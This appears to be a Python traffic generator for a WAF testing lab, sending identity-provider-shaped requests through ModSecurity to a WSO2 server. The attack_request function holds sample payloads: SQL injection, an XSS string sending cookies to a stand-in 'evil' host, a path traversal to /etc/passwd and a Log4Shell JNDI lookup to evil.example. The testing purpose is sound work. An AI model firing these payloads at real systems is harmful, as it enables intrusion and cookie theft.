"""
Realistic traffic generator for the pattern-lab stack.

Fires OIDC/SAML/SCIM-shaped requests THROUGH the WAF at a real WSO2 Identity
Server, mixed with a small amount of attack traffic. The goal is not to
complete real logins (that needs registered apps + credentials) — it is to
exercise the WAF with the request *shapes* a live IdP receives, so ModSecurity
produces an audit log the pattern engine can analyze.

The traffic mix is deliberately faithful:
  * ~85% legitimate IdP requests from MANY simulated client IPs (via
    X-Forwarded-For), carrying redirect_uri / state / code / SAMLRequest /
    sessionDataKey — the parameters that false-positive the CRS.
  * ~15% attack traffic from a FEW IPs: SQLi, XSS, path traversal, Log4Shell.

    TARGET=http://waf:8080 REQUESTS=600 python generate.py
"""
from __future__ import annotations

import base64
import os
import random
import sys
import time
import uuid
from urllib.parse import quote

try:
    import requests
except ImportError:  # pragma: no cover
    print("pip install requests", file=sys.stderr)
    raise

TARGET = os.environ.get("TARGET", "http://localhost:8080")
N = int(os.environ.get("REQUESTS", "600"))
random.seed()

LEGIT_CLIENTS = [f"10.0.{random.randint(0,50)}.{random.randint(1,254)}" for _ in range(150)]
ATTACKERS = ["45.9.148.3", "185.220.101.7", "91.219.236.19"]

REDIRECTS = [
    "https://app.example.com/callback",
    "https://portal.example.com/oidc/cb",
    "http://localhost:3000/",
]


def _b64(nbytes=16):
    return base64.urlsafe_b64encode(os.urandom(nbytes)).decode().rstrip("=")


def legit_request():
    ip = random.choice(LEGIT_CLIENTS)
    kind = random.choice(["authorize", "token", "saml", "commonauth", "scim"])
    if kind == "authorize":
        u = (f"/oauth2/authorize?response_type=code&client_id=sample_spa"
             f"&redirect_uri={quote(random.choice(REDIRECTS))}"
             f"&scope=openid%20profile&state={_b64()}")
        return "GET", u, ip, {}
    if kind == "token":
        u = f"/oauth2/token?grant_type=authorization_code&code={_b64(32)}&client_id=sample_spa"
        return "POST", u, ip, {}
    if kind == "saml":
        blob = base64.b64encode(f"<samlp:AuthnRequest ID='{uuid.uuid4()}'/>".encode()).decode()
        return "GET", f"/samlsso?SAMLRequest={quote(blob)}&RelayState=/portal", ip, {}
    if kind == "commonauth":
        return "GET", f"/commonauth?sessionDataKey={uuid.uuid4()}&type=oidc", ip, {}
    return "GET", f'/scim2/Users?filter=userName%20eq%20%22user{random.randint(1,99)}%22', ip, {}


def attack_request():
    ip = random.choice(ATTACKERS)
    kind = random.choice(["sqli", "xss", "lfi", "log4shell"])
    if kind == "sqli":
        p = quote("admin' OR 1=1-- -")
        return "POST", f"/authenticationendpoint/login.do?username={p}&password=x", ip, {}
    if kind == "xss":
        p = quote("<script>document.location='//evil/'+document.cookie</script>")
        return "GET", f"/authenticationendpoint/error.jsp?message={p}", ip, {}
    if kind == "lfi":
        return "GET", "/authenticationendpoint/css/../../../../etc/passwd", ip, {}
    return "GET", "/scim2/Users", ip, {"User-Agent": "${jndi:ldap://evil.example/a}"}


def main():
    sent = blocked = errors = 0
    for i in range(N):
        method, path, ip, hdrs = attack_request() if random.random() < 0.15 else legit_request()
        headers = {"X-Forwarded-For": ip, "Host": "id.example.com"}
        headers.setdefault("User-Agent", "Mozilla/5.0")
        headers.update(hdrs)
        try:
            r = requests.request(method, TARGET + path, headers=headers,
                                 timeout=8, verify=False, allow_redirects=False)
            sent += 1
            if r.status_code == 403:
                blocked += 1
        except Exception:  # noqa: BLE001
            errors += 1
        if i % 50 == 0:
            print(f"  {i}/{N}  sent={sent} blocked={blocked} errors={errors}")
        time.sleep(0.01)
    print(f"done: sent={sent} blocked={blocked} errors={errors}")
    print("Now analyze the WAF audit log:  python analyze.py audit/audit.jsonl")


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    main()
